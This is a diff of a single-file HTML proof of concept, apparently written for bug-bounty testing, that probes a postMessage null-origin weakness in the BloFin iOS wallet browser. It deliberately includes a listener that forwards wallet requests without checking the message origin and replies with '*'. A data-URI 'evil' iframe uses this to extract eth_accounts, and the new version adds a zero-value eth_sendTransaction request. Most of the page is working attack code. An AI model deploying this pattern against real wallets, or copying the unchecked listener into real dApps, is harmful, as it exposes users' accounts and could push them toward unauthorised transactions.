@@ -2,86 +2,94 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>BloFin Single File PostMessage Hijack - 0x403for</title>
+<title>BloFin v2 - postMessage Null Origin Test</title>
 <style>
 body{background:#000;color:#ddd;font-family:monospace;padding:12px;font-size:12px}
-h3{color:#f5c518}
-.box{border:1px solid #333;padding:10px;border-radius:10px;margin:10px 0;background:#111}
-pre{color:#0ff;white-space:pre-wrap;word-break:break-all;min-height:60px;background:#000;padding:8px;border-radius:6px;border:1px solid #333}
-button{width:100%;padding:13px;margin:6px 0;background:#f5c518;color:#000;font-weight:bold;border:none;border-radius:10px}
-span{color:#888}
+h3{color:#f5c518}.box{border:1px solid #333;padding:10px;border-radius:10px;margin:8px 0;background:#111}
+pre{color:#0ff;white-space:pre-wrap;word-break:break-all;background:#000;padding:8px;border-radius:6px;min-height:100px}
+button{width:100%;padding:13px;margin:5px 0;background:#f5c518;color:#000;font-weight:bold;border:none;border-radius:10px}
 </style>
 </head>
 <body>
-<h3>BloFin iOS - Single File PostMessage Provider Hijack</h3>
+<h3>BloFin iOS 1.8.5 - Single File v2</h3>
 <div class="box">
-Parent Origin: <b id="orig"></b><br>
-Child Iframe Origin: <b>null (data: URI = simulasi evil.com)</b>
-<pre id="log">Ready - BloFin iOS 1.8.5
-</pre>
+Origin: <b id="orig"></b><br>
+Evil Iframe Origin: <b>null (data: URI)</b>
+<pre id="log">Ready - Connect dulu!</pre>
 </div>
 
-<button onclick="direct()">1. DIRECT eth_accounts (normal)</button>
-<button onclick="selfPost()">2. SELF postMessage injection (*)</button>
-<button onclick="createEvil()">3. CREATE evil iframe (null origin) + REQUEST</button>
+<button onclick="connect()">1. CONNECT WALLET (eth_requestAccounts)</button>
+<button onclick="direct()">2. DIRECT eth_accounts</button>
+<button onclick="evilAccounts()">3. EVIL null-origin -> eth_accounts</button>
+<button onclick="evilTx()">4. EVIL null-origin -> eth_sendTransaction (0 value)</button>
 
-<div class="box">
-<iframe id="evil" style="width:100%;height:140px;border:1px solid #ff5555;border-radius:8px;display:none"></iframe>
-</div>
+<iframe id="evil" style="width:100%;height:160px;border:1px solid #ff5555;border-radius:8px;display:none"></iframe>
 
 <script>
-document.getElementById('orig').innerText = location.origin + " ("+location.href+")";
+document.getElementById('orig').innerText = location.origin;
 const logEl = document.getElementById('log');
 const log = (m)=>{ logEl.innerText += "\n"+m; console.log(m); }
 
-// LISTENER VULN - ini yang di-test: kalau listener pakai * tanpa cek e.origin = BUG
 window.addEventListener("message", async (e)=>{
-  log(`[RECEIVED] origin=${e.origin} | data=${JSON.stringify(e.data).slice(0,200)}`);
-  
-  // Simulasi DApp yang insecure: forward request dari child ke provider tanpa cek origin
-  if(e.data && e.data.type==="REQUEST_ACCOUNTS"){
-    log(`-> Child dari origin ${e.origin} minta accounts! Mencoba window.ethereum...`);
+  log(`[RECV] origin=${e.origin} data=${JSON.stringify(e.data).slice(0,250)}`);
+  if(e.data && e.data.type==="REQ_ACCOUNTS"){
     try{
       const acc = await window.ethereum.request({method:"eth_accounts"});
-      log(`-> PROVIDER LEAK! acc=${acc} - mengirim balik ke origin ${e.origin}`);
-      // VULN: kirim balik pakai * bukan e.origin
-      e.source.postMessage({type:"ACCOUNTS_LEAK", accounts: acc}, "*");
-    }catch(err){ log(`Provider blocked: ${err.message}`); }
+      log(`-> LEAK attempt to ${e.origin} acc=${acc}`);
+      e.source.postMessage({type:"LEAK", accounts:acc, from:"parent"}, "*");
+    }catch(err){ log(`Provider error: ${err.message}`); }
   }
-  if(e.data && e.data.type==="ACCOUNTS_LEAK"){
-    log(`!!! BUG CONFIRMED: Evil iframe dapat accounts: ${e.data.accounts} !!!`);
+  if(e.data && e.data.type==="REQ_TX"){
+    try{
+      // SAFE TX: 0 value to self, cuma test apakah prompt muncul dari null origin
+      const acc = await window.ethereum.request({method:"eth_accounts"});
+      const from = acc[0];
+      if(!from){ log("Connect dulu!"); return; }
+      const tx = {from: from, to: from, value:"0x0"};
+      log(`-> Trying eth_sendTransaction from null origin: ${JSON.stringify(tx)}`);
+      const hash = await window.ethereum.request({method:"eth_sendTransaction", params:[tx]});
+      log(`TX HASH: ${hash}`);
+      e.source.postMessage({type:"TX_HASH", hash:hash}, "*");
+    }catch(err){ log(`TX blocked/error: ${err.message}`); }
+  }
+  if(e.data && e.data.type==="LEAK"){
+    log(`!!! BUG CONFIRMED null origin dapat accounts: ${e.data.accounts}!!!`);
   }
 });
 
+async function connect(){
+  try{
+    const a = await window.ethereum.request({method:"eth_requestAccounts"});
+    log(`[CONNECT] ${a}`);
+  }catch(e){ log(`[CONNECT] ${e.message}`); }
+}
 async function direct(){
   try{
     const a = await window.ethereum.request({method:"eth_accounts"});
-    log(`[DIRECT] SUCCESS: ${a}`);
-  }catch(e){ log(`[DIRECT] BLOCKED: ${e.message}`); }
+    log(`[DIRECT] ${a}`);
+  }catch(e){ log(`[DIRECT] ${e.message}`); }
 }
-
-function selfPost(){
-  log(`[SELF] Sending postMessage * dengan method eth_accounts`);
-  window.postMessage({type:"REQUEST_ACCOUNTS", method:"eth_accounts", jsonrpc:"2.0", id:1}, "*");
+function evilAccounts(){
+  const f = document.getElementById('evil');
+  f.style.display='block';
+  const child = `<body style="background:#200;color:#fff;font-family:monospace;padding:8px">
+  EVIL (null)<script>
+  parent.postMessage({type:"REQ_ACCOUNTS"}, "*");
+  window.addEventListener("message",e=>{document.body.innerHTML+="<br>"+JSON.stringify(e.data)});
+  <\/script>`;
+  f.src = "data:text/html;base64,"+btoa(child);
+  log("[EVIL] Created null origin iframe -> REQ_ACCOUNTS");
 }
-
-function createEvil(){
-  const iframe = document.getElementById('evil');
-  iframe.style.display='block';
-  const childHtml = `
-    <body style="background:#200;color:#fff;font-family:monospace;padding:8px">
-    <b>EVIL IFRAME (data: URI, origin=null)</b>
-    <script>
-      parent.postMessage({type:"REQUEST_ACCOUNTS", method:"eth_accounts"}, "*");
-      window.addEventListener("message", (e)=>{
-        document.body.innerHTML += "<br>Got: "+JSON.stringify(e.data);
-        parent.postMessage({type:"LOG", msg: "child got "+JSON.stringify(e.data)}, "*");
-      });
-    <\/script>
-  `;
-  // data URI = origin null, simulasi evil.com
-  iframe.src = "data:text/html;base64,"+btoa(childHtml);
-  log(`[EVIL] Created data: URI iframe with null origin, sent REQUEST_ACCOUNTS`);
+function evilTx(){
+  const f = document.getElementById('evil');
+  f.style.display='block';
+  const child = `<body style="background:#200;color:#fff;font-family:monospace;padding:8px">
+  EVIL TX (null)<script>
+  parent.postMessage({type:"REQ_TX"}, "*");
+  window.addEventListener("message",e=>{document.body.innerHTML+="<br>"+JSON.stringify(e.data)});
+  <\/script>`;
+  f.src = "data:text/html;base64,"+btoa(child);
+  log("[EVIL] Created null origin iframe -> REQ_TX 0 value");
 }
 </script>
 </body>
